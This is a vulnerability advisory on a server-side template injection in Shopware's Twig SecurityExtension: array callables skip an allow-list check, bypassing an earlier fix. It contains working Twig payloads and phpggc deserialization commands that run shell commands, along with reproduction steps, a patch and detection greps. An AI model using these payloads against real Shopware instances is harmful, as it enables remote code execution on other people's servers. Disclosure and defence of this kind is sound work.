---
title: Server Side Template Injection via Twig Security Extension
date: 2023-04-15
---

### Overview:
Shopware is an e-commerce platform that is open source and built on the Symfony Framework and Vue.js. The default storefront of Shopware 6, called Shopware 6 Storefront, is based on Twig and Bootstrap. Users can customize the appearance of their storefront by using extensions (previously known as plugins) to override the default Twig template files. These custom themes can be enabled using the included Shopware 6 Administration panel.

### Summary:
Please note that this is a bypass of CVE-2023-22731, which is being tracked as issue [NEXT-24667](https://docs.shopware.com/en/shopware-6-en/security-updates/security-update-01-2023) by Shopware.

A vulnerability has been identified that allows bypassing the validation checks implemented by the `Shopware\Core\Framework\Adapter\Twig\SecurityExtension`. This extension is used to prevent the execution of arbitrary PHP functions through default filters in Twig, such as `map()`, `filter()`, `reduce()`, and `sort()`. The `SecurityExtension` was introduced in commit 89d1ea1 to address CVE-2023-22731. It overrides the aforementioned Twig filters (which are enabled by default) and ensures that the callable being executed is a permitted PHP function. However, there is a logic flaw in the validation process: the validation against the list of permitted functions is only performed if the argument passed to the filter is a string. By passing an array as a callable argument, the validation check can be bypassed.

As a result, this vulnerability allows a remote attacker who has access to a Twig environment to invoke any arbitrary PHP function and execute code or commands of their choice. This can be achieved by providing fully-qualified names as arrays of strings when referencing callables.

### CVSS3.1 Scoring System:

- Base Score: 8.8 (High)
- Vector String: `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`


| Type                      | Name                 |
| ------------------------- | -------------------- |
| Metric                      | Value             |
| Attack Vector (AV)                      | Network           |
| Attack Complexity (AC)                      | Low            |
| Privileges Required (PR)	                      | Low              |
| User Interaction (UI)                      | None         | 
| Scope (S)                      | Unchanged            | 
| Confidentiality (C)                      | High                  |
| Integrity (I)                      | High           |
| Availability (A)                      | High              |

### Vulnerability Details:

The vulnerability can be found in the SecurityExtension class declared in `src/Core/Framework/Adapter/Twig/SecurityExtension.php`:

```php
...
class SecurityExtension extends AbstractExtension
{
    ...

    /**
     * @return TwigFilter[]
     */
    public function getFilters(): array
    {
        return [
            new TwigFilter('map', [$this, 'map']),
            new TwigFilter('reduce', [$this, 'reduce']),
            new TwigFilter('filter', [$this, 'filter']),
            new TwigFilter('sort', [$this, 'sort']),
        ];
    }

    ...
    public function map(iterable $array, string|callable|\Closure $function): array
    {
        if (\is_string($function) && !\in_array($function, $this->allowedPHPFunctions, true)) { // [1]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $function));
        }

        $result = [];
        foreach ($array as $key => $value) {
            // @phpstan-ignore-next-line
            $result[$key] = $function($value); // [2]
        }

        return $result;
    }

    ...
    public function reduce(iterable $array, string|callable|\Closure $function, mixed $initial = null): mixed
    {
        if (\is_string($function) && !\in_array($function, $this->allowedPHPFunctions, true)) { // [3]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $function));
        }

        if (!\is_array($array)) {
            $array = iterator_to_array($array);
        }

        // @phpstan-ignore-next-line
        return array_reduce($array, $function, $initial); // [4]
    }

    ...
    public function filter(iterable $array, string|callable|\Closure $arrow): iterable
    {
        if (\is_string($arrow) && !\in_array($arrow, $this->allowedPHPFunctions, true)) { // [5]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $arrow));
        }

        if (\is_array($array)) {
            // @phpstan-ignore-next-line
            return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH); // [6]
        }

        // @phpstan-ignore-next-line
        return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
    }

    ...
    public function sort(iterable $array, string|callable|\Closure|null $arrow = null): array
    {
        if (\is_string($arrow) && !\in_array($arrow, $this->allowedPHPFunctions, true)) { // [7]
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $arrow));
        }

        if ($array instanceof \Traversable) {
            $array = iterator_to_array($array);
        }

        if ($arrow !== null) {
            // @phpstan-ignore-next-line
            uasort($array, $arrow); //[8]
        } else {
            asort($array);
        }

        return $array;
    }
}
```

At [1], the `$function` parameter contains the argument supplied to the filter. For example, it may refer to `funcname""` in `{{ array|filter("funcname") }}` or the closure (a.k.a. arrow function) `el => el != 'exclude'` in `{{ array|filter(el => el != 'exclude') }}`. Taking a closer look at the condition at [1], it can be observed that non-string arguments passes the validation check.
Notice that the validation check is only invoked if $function is a string. As such, non-string arguments may be passed to [2] due to the absence of type enforcement at [1]. At [2], variable functions (i.e. $function($value)) is invoked, thereby allowing arbitrary PHP functions to be executed. Largely identical code pattern can also be observed for the reduce() filter (at [3] and [4]), filter() filter (at [5] and [6]) and sort() filter (at [7] and [8]).

A common mistake that developers make is assuming that the callable type refers to a string type. This is untrue, and it is well documented in the PHP Manual:

A method of an instantiated object is passed as an array containing an object at index 0 and the method name at index 1. Accessing protected and private methods from within a class is allowed. Static class methods can also be passed without instantiating an object of that class by either, passing the class name instead of an object at index 0, or passing ClassName::methodName.

This means that all of the following variable function calls are valid:

#### Type 1: 
```
Simple callback -- invokes system("id")
$func = "system";
$func("id")
```
#### Type 2: 
```
Static class method call -- invokes Class::staticMethod($arg)
$func = $array("Class", "staticMethod");
$func($arg);
```

#### Type 3:
```
Object method call -- invokes $obj->method($arg)
$func = $array($obj, "method"));
$func($arg);
```

Going back to [1], if $arrow is an array instead of a string or closure, the validation check to prevent invocation of unsafe functions is completely skipped. Multiple static class methods within Shopware’s codebase and its dependencies were found to be suitable gadgets for achieving for remote code execution:

#### Gadget 1: 
Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()` to invoke unserialize()
Serialized payload generated using the phpggc tool: 

```
./phpggc -b Monolog/RCE8 system 'id'
```

Compressed payload is generated using:

```
php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"'
```

#### Gadget 2: 
Using `\Symfony\Component\VarDumper\Vardumper::setHandler()` and `\Symfony\Component\VarDumper\Vardumper::dump()` to invoke `system("id")`:

```
{{ ['system'] | filter(['\\Symfony\\Component\\VarDumper\\VarDumper', 'setHandler']) | length }}
```

#### Gadget 3: 
Using `\Symfony\Component\Process\Process::fromShellCommandline()` to invoke `proc_open("id > /tmp/pwned.txt")`:

```
{{ {'/':'id > /tmp/pwned.txt'} | map(['\\Symfony\\Component\\Process\\Process', 'fromShellCommandline']) | map(e => e.run()) | length }}
```

### Exploit Conditions:
This vulnerability can be exploited if the attacker has access to:
- an administrator account, or
- a non-administrative user account with permissions to create/edit Twig templates, such as:
1. Settings > Email templates permissions
2. Content > Themes permissions
3. Additional Permissions > Manage Extensions permissions

### Steps Reproduction:
For simplicity, the following proof-of-concept uses the administrator account to demonstrate how the vulnerability can be exploited using `Email templates`.
1. Navigate to `http://<shopware_target>/admin#/sw/mail/template/index` and login to an administrator account.
2. Click the `...` button for the first template (e.g. `Cancellation invoice`), and click the Edit button.
3. Under the `Mail text` section, enter the following payload for the `HTML` text area:

#### Gadget 1: 
Using `\Shopware\Core\Framework\Adapter\Cache\CacheValueCompressor::uncompress()` to invoke unserialize()
Serialized payload generated using the phpggc tool: 

```
./phpggc -b Monolog/RCE8 system 'id'
```
Compressed payload is generated using: 

```
php -r 'echo gzcompress(shell_exec("php phpggc Monolog/RCE8 system id"));' | hexdump -v -e '"\\\x" 1/1 "%02X"' 
```

4. In the right-sidebar, click the Show Preview button. Observe that the id shell command is executed successfully:
![img](https://starlabs.sg/advisories/23/images/CVE-2023-2017.png)

### Mitigations:
Patch the logic flaw in the `SecurityExtension` function declared in `src/Core/Framework/Adapter/Twig/SecurityExtension.php` to ensure that the parameter passed to the respective filter functions must either be a `string` or a `Closure` as such:
An sample patch is shown below for the map() filter:

```
    public function map(iterable $array, string|callable|\Closure $function): array
    {
-       if (\is_string($function) && !\in_array($function, $this->allowedPHPFunctions, true)) {
+       if (!($function instanceof \Closure) && (!(\is_string($function) && \in_array($function, $this->allowedPHPFunctions, true))) {
            throw new \RuntimeException(sprintf('Function "%s" is not allowed', $function));
        }

        $result = [];
        foreach ($array as $key => $value) {
            // @phpstan-ignore-next-line
            $result[$key] = $function($value);
        }

        return $result;
    }
```
### Detection Guidance:
The following strategies may be used to detect potential exploitation attempts.
1. Searching within Twig cache/compiled Twig template files using the following shell command `grep -Priz -e '\|\s*(filter|map|reduce|sort)\s*\(' --exclude \*url_matching_routes.php /path/to/webroot/var/cache/`
2. Searching within custom apps/plugins/themes using the following shell command `grep -Priz -e '\|\s*(filter|map|reduce|sort)\s*\(' /path/to/webroot/custom/`

Note that it is not possible to detect indicators of compromise reliably using the Shopware log file (located at `/path/to/webroot/var/log` by default), as successful exploitation attempts do not generate any additional logs. However, it is worthwhile to examine any PHP errors or warnings logged to determine the existence of any failed exploitation attempts.
